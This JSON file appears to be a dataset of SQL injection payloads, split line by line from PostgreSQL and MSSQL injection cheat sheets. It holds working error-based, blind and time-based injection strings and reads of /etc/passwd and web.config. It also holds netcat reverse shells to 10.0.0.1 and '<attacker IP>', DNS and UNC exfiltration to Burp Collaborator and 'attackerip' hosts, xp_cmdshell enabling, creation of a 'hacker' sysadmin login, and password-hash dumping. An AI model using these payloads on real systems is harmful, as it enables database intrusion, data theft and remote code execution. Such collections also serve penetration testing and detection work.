    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Current User           | `SELECT session_user;`                  |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Current User           | `SELECT usename FROM pg_user;`          |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Current User           | `SELECT getpgusername();`               |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Description            | SQL Query                                    |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| ---------------------- | -------------------------------------------- |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Databases         | `SELECT datname FROM pg_database`            |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Tables            | `SELECT table_name FROM information_schema.tables` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| CAST | `AND 1337=CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC) -- -` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| CAST | `AND (CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC)) -- -` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| CAST | `AND (SELECT version())::int=1 -- -` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT database_to_xml(true,true,''); -- dump the current database to XML",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Function    | Example                                         |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| ----------- | ----------------------------------------------- |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": ";(select 1 from pg_sleep(5))",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "||(select 1 from pg_sleep(5))",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "declare c text;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "declare p text;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT into p (SELECT YOUR-QUERY-HERE);",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "execute c;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "END;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "$$ language plpgsql security definer;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT f();",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "Use a semi-colon \"`;`\" to add another query",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select pg_ls_dir('./');",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "select pg_read_file('PG_VERSION', 0, 200);",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE TABLE temp(t TEXT);",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY temp FROM '/etc/passwd';",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM temp limit 1 offset 0;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT lo_get(16420); -- use the OID returned from the above",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT * from pg_largeobject; -- or just get all the large objects and their data",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE TABLE nc (t TEXT);",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM nc;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY nc(t) TO '/tmp/nc.sh';",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE TABLE shell(output text);",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| Payload            | Technique |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| ------------------ | --------- |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| `SELECT CHR(65)\\|\\|CHR(66)\\|\\|CHR(67);` | String from `CHR()` |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SHOW is_superuser;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT current_setting('is_superuser');",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)",
    "category": "sql injection",
    "source_file": "PostgreSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master..sysdatabases;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master.sys.databases;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT DB_NAME(N); \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "-- use xtype = 'V' for views\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master..sysobjects WHERE xtype = 'U';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    ' + convert(int,@@version) + '\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    ' + cast((SELECT @@version) as int) + '\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT message FROM data WHERE row = 1 and message like 't%'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1;waitfor delay '0:0:10'--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1);waitfor delay '0:0:10'--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1';waitfor delay '0:0:10'--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1');waitfor delay '0:0:10'--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1));waitfor delay '0:0:10'--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT 'A'SELECT 'B'SELECT 'C'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    -- you won't have the output of the query, redirect it to a file \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    ProductID=1; DROP members--\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "OPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "execute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC xp_cmdshell \"net user\";\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC sp_configure 'show advanced options',1;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RECONFIGURE;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC sp_configure 'xp_cmdshell',1;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "xp_dirtree '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "xp_fileexist '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "msf> use exploit/windows/mssql/mssql_linkcrawler\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select version from openquery(\"linkedserver\", 'select @@version as version');\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT is_srvrolemember('sysadmin');\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "-- 'sp_password' was found in the text of this event.\n",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or \"inject\" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Name                  | Description                           |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "|-----------------------|---------------------------------------|",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| pubs                 | Not available on MSSQL 2005           |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| model                 | Available in all versions             |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| msdb                 | Available in all versions             |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| tempdb             | Available in all versions             |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| northwind             | Available in all versions             |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| information_schema | Available from MSSQL 2000 and higher  |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| `/* MSSQL Comment */`      | C-style comment                   |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| `;%00`                     | Null byte                         |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Description     | SQL Query |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| --------------- | ----------------------------------------- |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| DBMS version    | `SELECT @@version`                        |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Database name   | `SELECT DB_NAME()`                        |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Database schema | `SELECT SCHEMA_NAME()`                    |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT HOST_NAME()`                      |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT @@hostname`                       |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT @@SERVERNAME`                     |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT SERVERPROPERTY('productversion')` |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| Hostname        | `SELECT SERVERPROPERTY('edition')`        |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| User            | `SELECT CURRENT_USER`                     |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| User            | `SELECT user_name();`                     |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
